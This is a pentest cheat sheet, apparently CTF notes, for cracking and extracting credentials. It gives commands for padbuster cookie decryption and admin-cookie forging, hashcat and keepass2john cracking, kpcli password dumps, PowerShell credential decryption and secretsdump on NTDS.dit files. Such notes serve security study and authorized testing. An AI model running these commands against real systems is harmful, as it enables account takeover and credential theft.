# Passwords and hashes
Ways to break password hashes, or just methods to make the brute-force easier.

# Adding salt (as a normal string) to a password file
This is if the password has no salt shown, because it has been concatenated when encrypting, therefore the salt has to be added to the dictionary, line-by-line.
```bash
sed -e 's/^/prefix/' <file> > <file.new>
```


# Cewl
Cewl can be used on a webpage, and if one suspects that a password is hidden somewhere in the website.

## Usage
```bash
cewl -w <wordlist> -d 10 -m 1 <url>
```


# Padding oracle attack
```bash
# Decrypt
padbuster <url> "cookie" 8 -encoding 0 -cookies "cookiename=cookie"

# Encrypt new cookie
padbuster <url> "old_cookie" 8 -encoding 0 -cookies "auth=old_cookie" -plaintext "user=admin"
```

### Reference
- [https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv](https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv)


# Powershell credentials file
The command below can be used to decrypt a given credentials file. **(has to be logged in as the user)**
```powershell
(Import-CliXml -Path user.txt).GetNetworkCredential().Password
```


# KeePass (jenkins) & kdbx files
1.  Use `keepass2john` to make the file into a hash.
2. Crack the hash file (from step 1) with hashcat, this will give you the **master password**    
    ```bash
    hashcat.bin CEH.kdbx.hash /usr/share/wordlists/rockyou.txt --user
    ```
3. Use `kpcli` to extract passwords: 
    ```bash
    kpcli --kdb <file>.kdbx
    ```
4. Run, `find .` in `kpcl`i will list all of the passwords
5. `show -f [num]` will print a password based on the number that was input 

# .dit and .bin files
**.dit** files contain password hashes     
**.bin** files contain information about the system

## Dump hashes
Assuming these files are on your local machine already.  
- Dump hashes  
    ```bash
    secretsdump.py -ntds <.dit file> -system <.bin file> LOCAL
    ```
- Crack the hashes
    ```bash
    # MD5
    hashcat -m 0 -a 0 hashfile /usr/share/wordlists/rockyou.txt
    # NTLM
    hashcat -m 1000 -a 0 hashfile /usr/share/wordlists/rockyou.txt
    ```

### Troubleshooting
#### If hashcat cannot crack the hashes
Try [crackstation](https://crackstation.net/), the hash might already be in their system.

### References
- [https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/post-exploitation/extracting-credentials/retrieve-windows-hashes](https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/post-exploitation/extracting-credentials/retrieve-windows-hashes)
- [https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html](https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html)